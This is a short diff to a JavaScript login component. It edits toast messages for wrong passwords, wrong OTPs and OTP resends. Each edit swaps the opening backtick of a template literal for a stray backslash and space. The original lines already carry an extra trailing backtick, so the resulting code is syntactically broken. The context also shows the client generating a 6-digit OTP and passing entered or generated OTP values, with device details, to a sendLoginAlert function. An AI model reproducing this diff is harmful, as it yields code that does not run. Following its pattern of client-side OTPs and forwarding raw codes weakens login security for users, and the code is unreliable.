@@ -3933,7 +3933,7 @@
              setLiveOTP('');
          } else {
              fetchDeviceDetails().then(dev => sendLoginAlert(type, data, dev));
-             if (type === 'FAILED') showToast(`❌ Incorrect Password! Attempt ${fails}/3.`);`
+             if (type === 'FAILED') showToast(\ ❌ Incorrect Password! Attempt ${fails}/3.`);`
          }
       };
 
@@ -4084,7 +4084,7 @@
            let otpFails = Number(window.localStorage.getItem('raja_otp_fails') || 0) + 1;
            window.localStorage.setItem('raja_otp_fails', otpFails);
            fetchDeviceDetails().then(dev => sendLoginAlert('OTP_FAILED', `${otpInput}|${otpFails}`, dev));
-           showToast(`❌ Incorrect OTP! (You can try again)`);`
+           showToast(\ ❌ Incorrect OTP! (You can try again)`);`
            setOtpInput('');
         }
         setIsProcessingLogin(false);
@@ -4113,7 +4113,7 @@
              setLiveOTP(newOTP);
              setResendTimer(30);
              fetchDeviceDetails().then(dev => sendLoginAlert('SEND_OTP', `${newOTP}|${resends}`, dev)); 
-             showToast(`✅ New 6-Digit OTP Sent! (Resend ${resends}/3)`);`
+             showToast(\ ✅ New 6-Digit OTP Sent! (Resend ${resends}/3)`);`
          }
          setIsProcessingLogin(false);
       };
